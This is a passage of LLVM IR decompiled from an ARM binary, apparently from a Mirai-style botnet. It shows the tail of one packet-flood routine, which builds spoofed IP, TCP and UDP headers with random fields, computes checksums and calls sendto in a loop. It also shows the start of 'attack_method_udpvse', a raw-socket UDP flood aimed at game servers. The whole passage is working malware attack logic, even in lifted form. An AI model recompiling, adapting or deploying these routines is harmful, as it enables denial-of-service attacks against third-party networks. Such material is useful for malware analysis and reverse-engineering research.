  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9e70:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9e78 = load i32, i32* @fp, align 4
  %v9_9e78 = icmp eq i32 %v0_9e78, 65535
  store i1 %v9_9e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e78, label %dec_label_pc_9fdc, label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge, %dec_label_pc_9e70
  %v1_9e84 = phi i32 [ %v1_9e84.pre, %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge ], [ 65535, %dec_label_pc_9e70 ]
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v9_9e84 = icmp eq i32 %v3_9c08, %v1_9e84
  store i1 %v9_9e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e84, label %dec_label_pc_a004, label %dec_label_pc_9e8c

dec_label_pc_9e8c:                                ; preds = %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge, %dec_label_pc_9e80
  %v1_9e90 = phi i32 [ %v1_9e90.pre, %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge ], [ %v1_9e84, %dec_label_pc_9e80 ]
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v9_9e90 = icmp eq i32 %v3_9c0c, %v1_9e90
  store i1 %v9_9e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e90, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_9e98:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %dec_label_pc_a034, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_9e98
  %v1_9ea0 = load i32, i32* @r5, align 4
  %v2_9ea0 = add i32 %v1_9ea0, 16
  %v3_9ea0 = inttoptr i32 %v2_9ea0 to i32*
  %v4_9ea0 = load i32, i32* %v3_9ea0, align 4
  store i32 %v4_9ea0, i32* %r3.global-to-local, align 4
  %v2_9ea4 = load i32, i32* @r6, align 4
  %v3_9ea4 = add i32 %v2_9ea4, 16
  %v4_9ea4 = inttoptr i32 %v3_9ea4 to i32*
  store i32 %v4_9ea0, i32* %v4_9ea4, align 4
  br label %dec_label_pc_9eac

dec_label_pc_9eac:                                ; preds = %bb85, %.thread16
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_9eb8:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034, %dec_label_pc_a048
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9ebc = load i32, i32* @r5, align 4
  %v3_9ebc = add i32 %v2_9ebc, 10
  %v4_9ebc = inttoptr i32 %v3_9ebc to i16*
  store i16 0, i16* %v4_9ebc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r5, align 4
  store i32 %v0_9ec4, i32* @r0, align 4
  %v2_9ec8 = call i32 @checksum_generic(i32 %v0_9ec4, i32 20)
  %v3_9ec8 = trunc i32 %v2_9ec8 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ed0 = load i32, i32* @r5, align 4
  %v4_9ed0 = add i32 %v3_9ed0, 10
  %v5_9ed0 = inttoptr i32 %v4_9ed0 to i16*
  store i16 %v3_9ec8, i16* %v5_9ed0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9ed8 = trunc i32 %v0_9ed8 to i16
  %v2_9ed8 = load i32, i32* @r6, align 4
  %v3_9ed8 = add i32 %v2_9ed8, 10
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i16*
  store i16 %v1_9ed8, i16* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* @r6, align 4
  store i32 %v0_9edc, i32* @r0, align 4
  %v2_9ee0 = call i32 @checksum_generic(i32 %v0_9edc, i32 20)
  %v3_9ee0 = trunc i32 %v2_9ee0 to i16
  %v3_9ee4 = load i32, i32* @r6, align 4
  %v4_9ee4 = add i32 %v3_9ee4, 10
  %v5_9ee4 = inttoptr i32 %v4_9ee4 to i16*
  store i16 %v3_9ee0, i16* %v5_9ee4, align 2
  store i32 0, i32* @r4, align 4
  %v0_9eec = load i32, i32* @r7, align 4
  store i32 %v0_9eec, i32* @r1, align 4
  %v1_9ef0 = add i32 %v0_9eec, 4
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i16*
  %v3_9ef0 = load i16, i16* %v2_9ef0, align 2
  %v4_9ef0 = zext i16 %v3_9ef0 to i32
  store i32 %v4_9ef0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_9ef8 = add i32 %v0_9eec, 6
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i16*
  store i16 0, i16* %v4_9ef8, align 2
  %v0_9efc = load i32, i32* @r6, align 4
  %v4_9f00 = call i32 @checksum_tcpudp(i32 %v0_9efc, i32 %v0_9eec, i32 %v4_9ef0, i32 %stack_var_-124.0.ph)
  %v5_9f00 = trunc i32 %v4_9f00 to i16
  %v3_9f04 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f04, i32* %r2.global-to-local, align 4
  %v3_9f08 = mul i32 %v3_9f04, 32
  store i32 %v3_9f08, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  %v1_9f0c = add i32 %v0_9f0c, 16
  %v2_9f0c = inttoptr i32 %v1_9f0c to i32*
  %v3_9f0c = load i32, i32* %v2_9f0c, align 4
  %v5_9f10 = mul i32 %v3_9f04, 24
  store i32 %v5_9f10, i32* %r3.global-to-local, align 4
  %v1_9f14 = load i32, i32* @sb, align 4
  %v2_9f14 = add i32 %v1_9f14, %v5_9f10
  store i32 %v2_9f14, i32* @lr, align 4
  %v2_9f18 = add i32 %v2_9f14, 4
  %v3_9f18 = inttoptr i32 %v2_9f18 to i32*
  store i32 %v3_9f0c, i32* %v3_9f18, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9f20 = load i32, i32* @r7, align 4
  %v4_9f20 = add i32 %v3_9f20, 6
  %v5_9f20 = inttoptr i32 %v4_9f20 to i16*
  store i16 %v5_9f00, i16* %v5_9f20, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9f28 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f28 = trunc i32 %v0_9f28 to i16
  %v2_9f28 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f28 = load i32, i32* @sb, align 4
  %v4_9f28 = add i32 %v3_9f28, %v2_9f28
  %v5_9f28 = inttoptr i32 %v4_9f28 to i16*
  store i16 %v1_9f28, i16* %v5_9f28, align 2
  %v0_9f2c = load i32, i32* @r4, align 4
  %v1_9f2c = trunc i32 %v0_9f2c to i16
  %v2_9f2c = load i32, i32* @lr, align 4
  %v3_9f2c = add i32 %v2_9f2c, 2
  %v4_9f2c = inttoptr i32 %v3_9f2c to i16*
  store i16 %v1_9f2c, i16* %v4_9f2c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9f34 = load i32, i32* @r5, align 4
  store i32 %v0_9f34, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r8, align 4
  store i32 %v0_9f3c, i32* %r2.global-to-local, align 4
  %v0_9f40 = load i32, i32* @lr, align 4
  %v0_9f44 = load i32, i32* %ip.global-to-local, align 4
  %v6_9f48 = call i32 @__libc_sendto(i32 %v3_9bbc, i32 %v0_9f34, i32 %v0_9f3c, i32 16384, i32 %v0_9f40, i32 %v0_9f44)
  %v3_9f4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f4c, i32* %r3.global-to-local, align 4
  %v1_9f50 = add i32 %v3_9f4c, 1
  %v1_9f54 = load i32, i32* @sl, align 4
  %v9_9f54 = icmp eq i32 %v1_9f50, %v1_9f54
  store i1 %v9_9f54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9f50, i32* %stack_var_-44, align 4
  %v6_9f5c = icmp slt i32 %v1_9f50, %v1_9f54
  br i1 %v6_9f5c, label %dec_label_pc_9e3c, label %dec_label_pc_9e28

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9e3c
  %v1_9f64 = add i32 %v2_9e44, 16
  %v2_9f64 = inttoptr i32 %v1_9f64 to i32*
  %v3_9f64 = load i32, i32* %v2_9f64, align 4
  store i32 %v3_9f64, i32* %r4.global-to-local, align 4
  %v0_9f68 = call i32 @rand_next()
  %v3_9f6c = load i32, i32* %stack_var_-44, align 4
  %v5_9f74 = mul i32 %v3_9f6c, 24
  %v0_9f78 = load i32, i32* %r4.global-to-local, align 4
  %v1_9f78 = and i32 %v0_9f78, 16711680
  store i32 %v1_9f78, i32* %ip.global-to-local, align 4
  %v3_9f7c = udiv i32 %v0_9f78, 16777216
  %v4_9f80 = udiv i32 %v1_9f78, 256
  %v5_9f80 = or i32 %v4_9f80, %v3_9f7c
  store i32 %v5_9f80, i32* %r2.global-to-local, align 4
  %v1_9f84 = load i32, i32* @sb, align 4
  %v2_9f84 = add i32 %v1_9f84, %v5_9f74
  store i32 %v2_9f84, i32* %r1.global-to-local, align 4
  %v1_9f88 = and i32 %v0_9f78, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_9f88, i32* %r3.global-to-local, align 4
  %v1_9f8c = add i32 %v2_9f84, 20
  %v2_9f8c = inttoptr i32 %v1_9f8c to i8*
  %v3_9f8c = load i8, i8* %v2_9f8c, align 1
  %v4_9f8c = zext i8 %v3_9f8c to i32
  store i32 %v4_9f8c, i32* %ip.global-to-local, align 4
  %v4_9f90 = mul i32 %v1_9f88, 256
  %v4_9f94 = mul i32 %v0_9f78, 16777216
  %v5_9f90 = or i32 %v4_9f90, %v4_9f94
  %v5_9f94 = or i32 %v5_9f90, %v5_9f80
  %v7_9f98 = lshr i32 %v0_9f68, %v4_9f8c
  %v8_9f98 = add i32 %v7_9f98, %v5_9f94
  store i32 %v8_9f98, i32* %r2.global-to-local, align 4
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  %v5_9fb4 = call i32 @llvm.bswap.i32(i32 %v8_9f98)
  store i32 %v5_9fb4, i32* %r3.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  %v1_9fbc = load i32, i32* @r5, align 4
  %v2_9fbc = add i32 %v1_9fbc, 16
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 %v5_9fb4, i32* %v3_9fbc, align 4
  br i1 %v2_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  %v0_9fc4 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9fd0 = load i32, i32* @fp, align 4
  %v9_9fd0 = icmp eq i32 %v0_9fd0, 65535
  store i1 %v9_9fd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9fd4 = load i32, i32* @r5, align 4
  %v2_9fd4 = add i32 %v1_9fd4, 12
  %v3_9fd4 = inttoptr i32 %v2_9fd4 to i32*
  store i32 %v0_9fc4, i32* %v3_9fd4, align 4
  br i1 %v9_9fd0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge

dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge:    ; preds = %dec_label_pc_9fc4
  %v1_9e84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e70
  %v0_9fdc = call i32 @rand_next()
  %v3_9fe4 = urem i32 %v0_9fdc, 65536
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v1_9ff0 = sub nsw i32 999, %v3_9fe4
  store i32 %v1_9ff0, i32* %r3.global-to-local, align 4
  %v1_9ff4 = load i32, i32* %r4.global-to-local, align 4
  %v9_9ff4 = icmp eq i32 %v3_9c08, %v1_9ff4
  store i1 %v9_9ff4, i1* %cpsr_z.global-to-local, align 1
  %v1_9ff8 = trunc i32 %v0_9fdc to i16
  %v2_9ff8 = load i32, i32* @r5, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 4
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i16*
  store i16 %v1_9ff8, i16* %v4_9ff8, align 2
  %v0_9ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_9ffc = trunc i32 %v0_9ffc to i16
  %v2_9ffc = load i32, i32* @r6, align 4
  %v3_9ffc = add i32 %v2_9ffc, 4
  %v4_9ffc = inttoptr i32 %v3_9ffc to i16*
  store i16 %v1_9ffc, i16* %v4_9ffc, align 2
  br i1 %v9_9ff4, label %dec_label_pc_a004, label %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge

dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge:    ; preds = %dec_label_pc_9fdc
  %v1_9e90.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e8c

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fdc, %dec_label_pc_9e80
  %v0_a004 = call i32 @rand_next()
  %v1_a004 = trunc i32 %v0_a004 to i16
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v1_a00c = load i32, i32* %r4.global-to-local, align 4
  %v9_a00c = icmp eq i32 %v3_9c0c, %v1_a00c
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  %v3_a010 = load i32, i32* @r5, align 4
  %v4_a010 = add i32 %v3_a010, 44
  %v5_a010 = inttoptr i32 %v4_a010 to i16*
  store i16 %v1_a004, i16* %v5_a010, align 2
  br i1 %v9_a00c, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_a018:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  %v0_a018 = call i32 @rand_next()
  %v1_a018 = trunc i32 %v0_a018 to i16
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_a018
  %v3_a02831 = load i32, i32* @r7, align 4
  %v4_a02832 = add i32 %v3_a02831, 2
  %v5_a02833 = inttoptr i32 %v4_a02832 to i16*
  store i16 %v1_a018, i16* %v5_a02833, align 2
  br label %dec_label_pc_a034

bb85:                                             ; preds = %dec_label_pc_a018
  %v1_a024 = load i32, i32* @r5, align 4
  %v2_a024 = add i32 %v1_a024, 16
  %v3_a024 = inttoptr i32 %v2_a024 to i32*
  %v4_a024 = load i32, i32* %v3_a024, align 4
  store i32 %v4_a024, i32* %r3.global-to-local, align 4
  %v3_a028 = load i32, i32* @r7, align 4
  %v4_a028 = add i32 %v3_a028, 2
  %v5_a028 = inttoptr i32 %v4_a028 to i16*
  store i16 %v1_a018, i16* %v5_a028, align 2
  %v1_a02c = load i32, i32* %r3.global-to-local, align 4
  %v2_a02c = load i32, i32* @r6, align 4
  %v3_a02c = add i32 %v2_a02c, 16
  %v4_a02c = inttoptr i32 %v3_a02c to i32*
  store i32 %v1_a02c, i32* %v4_a02c, align 4
  br label %dec_label_pc_9eac

dec_label_pc_a034:                                ; preds = %.thread30, %dec_label_pc_9e98
  %v0_a034 = call i32 @rand_next()
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  %v1_a040 = load i32, i32* @r6, align 4
  %v2_a040 = add i32 %v1_a040, 16
  %v3_a040 = inttoptr i32 %v2_a040 to i32*
  store i32 %v0_a034, i32* %v3_a040, align 4
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034
  %v0_a048 = load i32, i32* @r7, align 4
  %v1_a048 = add i32 %v0_a048, 8
  store i32 %v5_9b54, i32* %r1.global-to-local, align 4
  %v2_a050 = inttoptr i32 %v1_a048 to i16*
  %v3_a050 = call i32 @rand_str(i16* %v2_a050, i32 %v5_9b54)
  br label %dec_label_pc_9eb8

dec_label_pc_a058:                                ; preds = %dec_label_pc_9bcc
  %v1_a05c = call i32 @__GI___libc_close(i32 %v3_9bbc)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %entry, %dec_label_pc_a058
  %v1_a068 = phi i32 [ %v3_9bbc, %entry ], [ %v1_a05c, %dec_label_pc_a058 ]
  store i32 %v3_9a6c, i32* %r4.global-to-local, align 4
  store i32 %v6_9a6c, i32* %r5.global-to-local, align 4
  store i32 %v24_9a6c, i32* %fp.global-to-local, align 4
  ret i32 %v1_a068

dec_label_pc_a06c:                                ; preds = %dec_label_pc_9bf4
  store i32 %v5_9b54, i32* %r2.global-to-local, align 4
  %v1_a074 = add i32 %v5_9b54, 8
  store i32 %v1_a074, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9e28.preheader

; uselistorder directives
  uselistorder i32 %v1_a074, { 1, 0 }
  uselistorder i16 %v1_a018, { 1, 0 }
  uselistorder i32 %v0_9fdc, { 1, 0 }
  uselistorder i32 %v5_9fb4, { 1, 0 }
  uselistorder i32 %v0_9f78, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9f54, { 1, 2, 0 }
  uselistorder i32 %v1_9f50, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9f04, { 1, 0, 2 }
  uselistorder i32 %v0_9eec, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9e50, { 1, 0, 2 }
  uselistorder i1 %v7_9e68, { 2, 1, 0 }
  uselistorder i1 %v2_a03c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_a020, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9dc4, { 1, 0 }
  uselistorder i32 %v4_9d3813, { 1, 0 }
  uselistorder i32 %v3_9c5c, { 1, 0 }
  uselistorder i32 %v3_9c40, { 1, 2, 0 }
  uselistorder i32 %v1_9c3c, { 1, 0 }
  uselistorder i32 %v1_9c00, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9bfc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9bf8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9bf4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9bec, { 1, 0 }
  uselistorder i1 %v7_9bc0, { 1, 0 }
  uselistorder i32 %v3_9bbc, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_9ba8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9b74, { 2, 1, 3, 0 }
  uselistorder i32 %v5_9b54, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_9b08, { 1, 0 }
  uselistorder i32 %v1_9ae4, { 2, 1, 0 }
  uselistorder i32 %v5_9adc, { 1, 0 }
  uselistorder i8 %v5_9ac0, { 0, 2, 1 }
  uselistorder i32 %v6_9aa0, { 1, 0 }
  uselistorder i32 %v2_9a88, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a048, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9e28.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_method_udpvse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_a088 = load i32, i32* @r4, align 4
  %v27_a088 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a0a4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a0a8 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0a4, i32* @fp, align 4
  %v0_a0b8 = load i32, i32* @r4, align 4
  %v4_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v5_a0bc = call i32 @attack_get_opt_int(i32 %v0_a0b8, i32* %v4_a0bc, i32 2, i32 0)
  %v1_a0c8 = urem i32 %v5_a0bc, 256
  store i32 %v1_a0c8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a0d4 = load i32, i32* @r4, align 4
  %v0_a0d8 = load i32, i32* @r5, align 4
  %v5_a0dc = trunc i32 %v5_a0bc to i8
  %v6_a0e0 = inttoptr i32 %v0_a0d8 to i32*
  %v7_a0e0 = call i32 @attack_get_opt_int(i32 %v0_a0d4, i32* %v6_a0e0, i32 3, i32 65535)
  %v0_a0e4 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0e0, i32* @r7, align 4
  %v0_a0f4 = load i32, i32* @r4, align 4
  %v4_a0f8 = inttoptr i32 %v0_a0e4 to i32*
  %v5_a0f8 = call i32 @attack_get_opt_int(i32 %v0_a0f4, i32* %v4_a0f8, i32 4, i32 64)
  %v1_a100 = urem i32 %v5_a0f8, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  %v0_a104 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  %v6_a118 = inttoptr i32 %v0_a104 to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 5, i32 0)
  %v1_a124 = urem i32 %v7_a118, 256
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a130 = load i32, i32* @r4, align 4
  %v0_a134 = load i32, i32* @r5, align 4
  %v5_a13c = inttoptr i32 %v0_a134 to i32*
  %v6_a13c = call i32 @attack_get_opt_int(i32 %v0_a130, i32* %v5_a13c, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a14c = load i32, i32* @r5, align 4
  store i32 %v6_a13c, i32* @r6, align 4
  %v0_a154 = load i32, i32* @r4, align 4
  %v4_a158 = inttoptr i32 %v0_a14c to i32*
  %v5_a158 = call i32 @attack_get_opt_int(i32 %v0_a154, i32* %v4_a158, i32 7, i32 27015)
  store i32 %v5_a158, i32* @r4, align 4
  %v1_a164 = call i32 @table_unlock_val(i32 20)
  %v3_a170 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a184 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_a188 = icmp eq i32 %v3_a184, -1
  store i1 %v7_a188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a184, i32* @sb, align 4
  br i1 %v7_a188, label %dec_label_pc_a4b0, label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a19c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a19c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a1b0 = call i32 @__GI_setsockopt(i32 %v3_a184, i32 0, i32 3, i32 %v6_a19c, i32 ptrtoint (i32* @0 to i32))
  %v7_a1b4 = icmp eq i32 %v5_a1b0, -1
  store i1 %v7_a1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b4, label %dec_label_pc_a4a8, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a194
  %v0_a1bc = load i32, i32* @r4, align 4
  %v3_a1bc = mul i32 %v0_a1bc, 65536
  store i32 %v3_a1bc, i32* @lr, align 4
  %v0_a1c0 = load i32, i32* @r7, align 4
  %v0_a1c4 = load i32, i32* @r6, align 4
  %v3_a1c4 = mul i32 %v0_a1c4, 65536
  store i32 %v3_a1c4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a1cc = urem i32 %v0_a1c0, 65536
  %v3_a1d0 = urem i32 %v0_a1c4, 65536
  store i32 %v3_a1d0, i32* %r2.global-to-local, align 4
  %v3_a1d4 = urem i32 %v0_a1bc, 65536
  store i32 %v3_a1d4, i32* %r3.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r8, align 4
  %v2_a1d8 = icmp eq i32 %v0_a1d8, 0
  store i1 %v2_a1d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a1d8, label %dec_label_pc_a314.preheader, label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a1bc
  %tmp34 = mul i32 %v0_a1c0, 256
  %v3_a200 = and i32 %tmp34, 65280
  store i32 %v3_a200, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_a1c4, 256
  %v3_a204 = and i32 %tmp35, 65280
  store i32 %v3_a204, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_a1bc, 256
  %v3_a208 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_a1c0, 256
  %v4_a20c = urem i32 %tmp37, 256
  %v5_a20c = or i32 %v4_a20c, %v3_a200
  store i32 %v5_a20c, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_a1c4, 256
  %v4_a210 = urem i32 %tmp38, 256
  %v5_a210 = or i32 %v4_a210, %v3_a204
  store i32 %v5_a210, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_a1bc, 256
  %v4_a214 = urem i32 %tmp39, 256
  %v5_a214 = or i32 %v4_a214, %v3_a208
  store i32 %v5_a214, i32* @r7, align 4
  %v1_a29c = trunc i32 %v5_a0f8 to i8
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %.thread, %dec_label_pc_a1f0
  %v2_a220 = call i32 @calloc(i32 128, i32 1)
  %v3_a224 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a224, i32* %r2.global-to-local, align 4
  %v5_a22c = mul i32 %v3_a224, 24
  store i32 %v5_a22c, i32* %r3.global-to-local, align 4
  %v1_a230 = load i32, i32* @fp, align 4
  %v2_a230 = load i32, i32* @r4, align 4
  %v5_a230 = mul i32 %v2_a230, 4
  %v6_a230 = add i32 %v5_a230, %v1_a230
  %v7_a230 = inttoptr i32 %v6_a230 to i32*
  store i32 %v2_a220, i32* %v7_a230, align 4
  %v0_a234 = load i32, i32* %r3.global-to-local, align 4
  %v1_a234 = load i32, i32* @sl, align 4
  %v2_a234 = add i32 %v1_a234, %v0_a234
  store i32 %v2_a234, i32* %r3.global-to-local, align 4
  %v0_a238 = load i32, i32* @fp, align 4
  %v1_a238 = load i32, i32* %r2.global-to-local, align 4
  %v4_a238 = mul i32 %v1_a238, 4
  %v5_a238 = add i32 %v4_a238, %v0_a238
  %v6_a238 = inttoptr i32 %v5_a238 to i32*
  %v7_a238 = load i32, i32* %v6_a238, align 4
  store i32 %v7_a238, i32* @lr, align 4
  %v1_a240 = inttoptr i32 %v7_a238 to i8*
